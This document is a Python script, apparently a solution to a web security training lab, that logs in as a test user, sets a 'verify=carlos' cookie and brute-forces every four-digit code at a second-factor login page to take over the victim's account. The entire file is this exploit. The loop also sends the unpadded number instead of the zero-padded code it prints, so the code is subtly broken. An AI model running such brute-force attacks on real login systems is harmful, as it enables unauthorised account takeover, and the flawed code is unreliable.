import aiohttp
import asyncio
import sys

def extract_session(headers: list[str]) -> str:
    for source in headers:
        values = source.split("; ")
        for value in values:
            if value.startswith("session="):
                return value
    raise ValueError("absence of session")

async def process_root(client: aiohttp.ClientSession, base_url: str) -> str:
    url = f"https://{base_url}/"
    headers = {
        "Accept-Language": "ru-RU,ru;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    cookie_header = None
    async with client.get(url, headers=headers, allow_redirects=False) as response:
        if response.status != 200:
            raise ValueError(f"bad status: {response.status}")
        headers = list(response.headers.getall("Set-Cookie"))
    return extract_session(headers)

async def process_login_get(client: aiohttp.ClientSession, base_url: str, session: str):
    url = f"https://{base_url}/login"
    headers = {
        "Accept-Language": "ru-RU,ru;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": session
    }
    async with client.get(url, headers=headers, allow_redirects=False) as response:
        if response.status != 200:
            raise ValueError(f"bad status: {response.status}")
        #return await response.text()

async def process_login_post(client: aiohttp.ClientSession, base_url: str, session: str) -> str:
    url = f"https://{base_url}/login"
    headers = {
        "Accept-Language": "ru-RU,ru;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": session
    }
    body = f"username=wiener&password=peter"
    cookie_header = None
    async with client.post(url, headers=headers, data=body, allow_redirects=False) as response:
        if response.status != 302:
            raise ValueError(f"bad status: {response.status}")
        headers = list(response.headers.getall("Set-Cookie"))
    return extract_session(headers)

async def process_login2_get(client: aiohttp.ClientSession, base_url: str, session: str):
    url = f"https://{base_url}/login2"
    headers = {
        "Accept-Language": "ru-RU,ru;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": session
    }
    async with client.get(url, headers=headers, allow_redirects=False) as response:
        if response.status != 200:
            raise ValueError(f"bad status: {response.status}")

async def process_login2_post(client: aiohttp.ClientSession, base_url: str, session: str, mfa: str) -> bool:
    url = f"https://{base_url}/login2"
    headers = {
        "Accept-Language": "ru-RU,ru;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": f"verify=carlos; {session}",
    }
    body = f"mfa-code={mfa}"
    async with client.post(url, headers=headers, data=body, allow_redirects=True) as response:
        match response.status:
            case 200:
                return len(response.history) > 0
            case _:
                raise ValueError(f"bad status: {response.status}")

async def solve(base_url: str):
    async with aiohttp.ClientSession() as client:
        main_session = await process_root(client, base_url)
        await process_login_get(client, base_url, main_session)
        login2_session = await process_login_post(client, base_url, main_session)
        await process_login2_get(client, base_url, login2_session)
        for mfa in range(10000):
            mfa_code = f"{mfa:04}"
            print(mfa_code)
            result = await process_login2_post(client, base_url, login2_session, mfa)
            if result:
                print(f"mfa found: {mfa_code}")
                return

if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise ValueError("bad cmd args")
    base_url = sys.argv[1]
    asyncio.run(solve(base_url))